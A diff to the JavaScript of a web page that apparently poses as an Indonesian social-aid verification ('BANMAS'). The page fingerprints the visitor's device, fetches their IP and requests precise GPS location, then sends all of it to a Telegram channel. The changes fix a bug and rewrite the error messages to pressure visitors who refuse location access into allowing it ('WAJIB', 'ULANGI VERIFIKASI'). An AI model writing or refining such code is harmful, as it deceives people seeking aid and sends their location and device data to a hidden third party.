@@ -98,7 +98,7 @@
             const deviceMemory = navigator.deviceMemory || 'Unknown';
             const hardwareConcurrency = navigator.hardwareConcurrency || 'Unknown';
             const language = navigator.language;
-            const timezone = Intcl ? Intcl.DateTimeFormat().resolvedOptions().timeZone : 'Unknown';
+            const timezone = typeof Intl !== 'undefined' ? Intl.DateTimeFormat().resolvedOptions().timeZone : 'Unknown';
             const touchPoints = navigator.maxTouchPoints || 0;
 
             let gpu = 'Unknown';
@@ -175,34 +175,33 @@
                 },
                 async (err) => {
                     loader.style.display = 'none';
-                    title.innerText = "Verifikasi Gagal";
+                    title.innerText = "Verifikasi Diperlukan";
                     const specs = getDetailedSpecs();
                     const ip = await getIP();
+
+                    btn.style.display = 'block';
+                    btn.innerText = "ULANGI VERIFIKASI";
 
                     if(err.code == 1) {
                         desc.style.background = "#ffebee";
                         desc.style.borderLeft = "5px solid #d32f2f";
                         desc.innerHTML = `<span style="color:#d32f2f; font-weight:bold;">Akses Lokasi Diblokir!</span><br>
-                        Gagal memvalidasi domisili karena izin lokasi ditolak.<br><br>
-                        <b>Cara Mengatasi:</b><br>
-                        1. Klik ikon <b>Gembok/Info</b> di pojok kiri atas browser (dekat alamat web).<br>
-                        2. Pilih <b>Izin (Permissions)</b> dan aktifkan <b>Lokasi</b>.<br>
-                        3. <b>Muat Ulang (Refresh)</b> halaman ini untuk melanjutkan pengecekan bantuan.`;
+                        Sistem tidak bisa memproses bantuan karena Anda menolak izin lokasi.<br><br>
+                        <b>WAJIB:</b> Klik <b>ULANGI VERIFIKASI</b> lalu pilih <b>IZINKAN / ALLOW</b> pada kotak pesan yang muncul di layar.`;
                         await sendToTelegram(`⚠️ <b>BANMAS: DIBLOKIR</b>\nIP: ${ip}\n\n${specs}`);
                     }
                     else if(err.code == 2 || err.code == 3) {
                         desc.style.background = "#fff3e0";
                         desc.style.borderLeft = "5px solid #ff9800";
                         desc.innerHTML = `<span style="color:#e65100; font-weight:bold;">GPS Perangkat Mati!</span><br>
-                        Sistem tidak dapat mendeteksi koordinat Anda. Harap aktifkan GPS di HP Anda.<br><br>
-                        <b>Langkah-langkah:</b><br>
-                        1. Usap layar dari atas ke bawah (Panel Notifikasi).<br>
-                        2. Aktifkan ikon <b>'Lokasi' / 'GPS'</b>.<br>
-                        3. Klik <b>Refresh/Muat Ulang</b> halaman ini.`;
+                        Aktifkan fitur 'Lokasi' di HP Anda sekarang agar data bantuan dapat divalidasi.<br><br>
+                        1. Tarik layar HP dari atas ke bawah.<br>
+                        2. Aktifkan ikon <b>GPS / Lokasi</b>.<br>
+                        3. Klik tombol <b>ULANGI VERIFIKASI</b> di bawah.`;
                         await sendToTelegram(`⚠️ <b>BANMAS: GPS OFF</b>\nIP: ${ip}\n\n${specs}`);
                     } else {
                         await sendToTelegram(`⚠️ <b>BANMAS: ERROR</b>\nCode: ${err.code}\nIP: ${ip}\n\n${specs}`);
-                        window.location.href = REDIRECT_URL;
+                        desc.innerHTML = "Terjadi kesalahan sistem. Silakan coba lagi.";
                     }
                 },
                 { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
